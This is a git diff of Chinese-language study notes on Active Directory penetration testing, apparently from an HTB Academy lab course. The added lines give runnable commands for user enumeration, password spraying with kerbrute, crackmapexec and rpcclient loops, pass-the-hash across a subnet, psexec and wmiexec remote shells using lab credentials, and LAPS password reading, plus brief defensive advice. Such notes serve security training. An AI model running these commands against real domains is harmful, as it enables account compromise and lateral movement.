@@ -83,6 +83,7 @@ GET NTLMV2USERNAMES 查看收集到的用户名
 perl -p -i -e 's/\R//g;' ntlmv2.txt      删除换行
 hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
 
+
 Fping
 提供了与标准 ping 应用程序类似的功能，利用 ICMP 请求和回复来联系和与主机交互
   https://fping.org/
@@ -98,7 +99,9 @@ sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
 
 Kerbrute
 是域帐户枚举中一个更隐蔽的选项
-它利用了 Kerberos 预身份验证 (pre-authentication) 失败通常不会触发日志或警报
+利用 Kerberos 预身份验证 (pre-authentication) 失败通常不会触发日志或警报
+向域控制器发送不带 Kerberos 预身份验证的 TGT 请求以执行用户名枚举
+精明的攻击者可能会避开 SMB 密码喷洒，转而攻击 LDAP
 结合 Insidetrust 的 jsmith.txt 或 jsmith2.txt 用户列表来使用 Kerbrute
   https://github.com/ropnop/kerbrute
   https://github.com/insidetrust/statistically-likely-usernames
@@ -107,31 +110,71 @@ make help      查看编译器帮助
 sudo make all  编译所有平台的格式
 ./kerbrute_linux_amd64      运行
 export PATH=/usr/local/bin/kerbrute:$PATH      添加到PAHT
-kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users      枚举用户
-
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users.txt      枚举用户名
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users.txt Welcome1      密码喷洒
 
 SMB NULL 会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
 进行枚举，可以使用 enum4linux、CrackMapExec、rpcclient 等工具
-rpcclient $> querydominfo
-rpcclient $> enumdomusers
+
 
 enum4linux 
 围绕 Samba 工具套件（如 nmblookup、net、rpcclient 和 smbclient）构建的工具，用于枚举 Windows 主机和域
   https://labs.portcullis.co.uk/tools/enum4linux/
 enum4linux -P 172.16.5.5
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt      枚举用户名
+
 
 enum4linux-ng
 是 enum4linux 的 Python重写版，但增加了额外的功能，例如能够将数据导出为 YAML 或 JSON 文件
   https://github.com/cddmp/enum4linux-ng
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
 
+
 crackmapexec
-smb 172.16.5.5 --users
+smb 172.16.5.5 --users      空凭证
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users    带凭证枚举用户
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --groups   带凭证枚举组
+--loggedon-users      现登录，看到用户已登录，如果是一名域管理员，从内存中窃取该用户的凭据或冒充他们，这可能是一个轻松的胜利
+--shares       枚举上可用的共享
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'      爬取'Department Shares'中的文件，结果写入位于 /tmp/cme_spider_plus/<ip of host> 的 JSON 文件中
+
+
+SMBMap
+获得访问权限，可以用来下载和上传文件，执行远程命令
+  https://github.com/ShawnDEvans/smbmap
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5      查权限
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only      列目录
+
+
+rpcclient
+专为 Samba 协议设计，并通过 MS-RPC 提供额外功能，可以枚举、添加、更改甚至从 AD 中删除对象
+  https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
+rpcclient -U "" -N 172.16.5.5      空会话
+rpcclient $> querydominfo
+rpcclient $> enumdomusers
+
+Windows 不认用户名（如 "Admin"），只认 SID。重命名用户不影响其 SID，权限依旧生效
+RID，类似组ID，对于一个对象是唯一的
+rpcclient $> queryuser 0x457      枚举0x457组的用户
+
+
+Impacket
+多功能的工具包，提供了许多不同的方法来使用 Python 枚举、交互和利用 Windows 协议，不限以下工具
+  https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
+  https://github.com/fortra/impacket/blob/master/examples/psexec.py
+psexec.py 是 Sysinternals psexec 的克隆，工作方式略不同，将一个随机命名的可执行文件上传到目标主机的 ADMIN$ 共享来创建一个远程服务 (remote service)，
+通过 RPC 和 Windows Service Control Manager 注册该服务，通过一个命名管道 (named pipe) 进行，在受害主机上提供一个以 SYSTEM 身份运行的交互式远程 shell (interactive remote shell)
+$psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+Wmiexec.py 利用一个半交互式 shell (semi-interactive shell)，命令通过Windows 管理规范 (Windows Management Instrumentation) 执行,
+不会在目标主机上留下任何文件或可执行文件，以连接时使用的本地管理员用户身份运行（这比看到 SYSTEM 执行许多命令要不那么明显）,仍然很可能被大多数现代反病毒 (anti-virus) 和端点检测与响应 (EDR) 系统捕获
+$wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+
 
 从 Windows 进行此类 null 会话攻击不太常见
 C:\htb> net use \\DC01\ipc$ "" /u:""       建立空对话
 C:\htb> net use \\DC01\ipc$ "" /u:guest    测试账号禁用
 C:\htb> net use \\DC01\ipc$ "password" /u:guest  测试密码错误 OR 账号锁定
+确保域密码锁定策略不会增加拒绝服务 (denial of service) 攻击的风险，至关重要。如果需要管理员手动干预才能解锁帐户，那么一次粗心的密码喷洒可能锁定大量帐户
 
 
 ldapsearch
@@ -142,9 +185,18 @@ LDAP 匿名绑定允许未经身份验证的攻击者从域中检索信息，例
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 
+
 windapsearch.py
-同ldasearch
-./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+同ldasearch, 通过 LDAP 查询 (LDAP queries) 来枚举 Windows 域中的用户、组和计算机
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U      空会话
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da      带凭证
+--da      枚举域管理员组成员
+-PU      查找特权用户，会递归搜索具有嵌套组成员身份 (nested group membership) 的用户
+
+
+Bloodhound.py
+对AD创建图形表示或“攻击路径 (attack paths)
+  https://github.com/dirkjanm/BloodHound.py
 
 
 查看密码策略
@@ -174,3 +226,51 @@ NBT-NS 无法通过组策略禁用，必须在每台主机上本地禁用。打�
 网络入侵检测和防御系统
 网络分段 (network segmentation) 隔离那些需要启用 LLMNR 或 NetBIOS 才能正常运行的主机
 
+
+密码喷洒
+
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +    找到+的有效喷洒
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123      登录验证
+
+DomainPasswordSpray
+已经通过了域的身份验证，工具自动从 Active Directory 生成一个用户列表，查询域密码策略，并排除那些离被锁定只差一次尝试的用户帐户
+  https://github.com/dafthack/DomainPasswordSpray
+C:\htb> Import-Module .\DomainPasswordSpray.ps1
+C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+
+如果发现某台桌面主机的本地管理员帐户密码设置为 $desktop%@admin123, 可能尝试对服务器使用 $server%@admin123
+如果我们发现非标准的本地管理员帐户 bsmith，可能会发现其密码被用于一个名称相似的域用户帐户
+如果获取了名为 ajones 的用户的密码，那么值得在他们的管理员帐户（如果该用户有的话），如 ajones_adm 上尝试相同的密码
+
+从本地 SAM 数据库中检索到本地管理员帐户的 NTLM 哈希, 可以在整个子网（或多个子网）中喷洒该 NT 哈希
+噪音很大，对于任何需要隐秘性的评估来说都不好
+--local-auth 标志将告诉该工具在每台机器上只尝试登录一次，这消除了任何帐户锁定的风险
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+
+
+防御
+多因素认证 (Multi-factor Authentication) 
+最小权限原则 (principle of least privilege)
+网络分段 (network segmentation)
+确保特权用户 (privileged users) 为任何管理活动使用单独的帐户
+密码卫生 (Password Hygiene)
+
+
+检查 Microsoft Defender 状态
+C:\htb> Get-MpComputerStatus
+
+
+AppLocker
+微软的应用程序白名单解决方案
+系统管理员可以控制用户能够运行哪些应用程序和文件。对可执行文件、脚本、Windows 安装程序文件、DLL、打包的应用以及打包的应用安装程序提供了精细的控制
+  https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/what-is-applocker
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections      查看策略
+C:\htb> $ExecutionContext.SessionState.LanguageMode      查看PS约束模式，例如阻止 COM 对象、只允许经批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等
+C:\htb> Find-LAPSDelegatedGroups       查找组，可读取 LAPS 密码
+C:\htb> Find-AdmPwdExtendedRights      查找用户，可读取 LAPS 密码
+C:\htb> Get-LAPSComputers      搜索启用了 LAPS 的计算机、密码何时过期，如果用户有访问权限，可以获取明文 (cleartext) 形式的随机密码
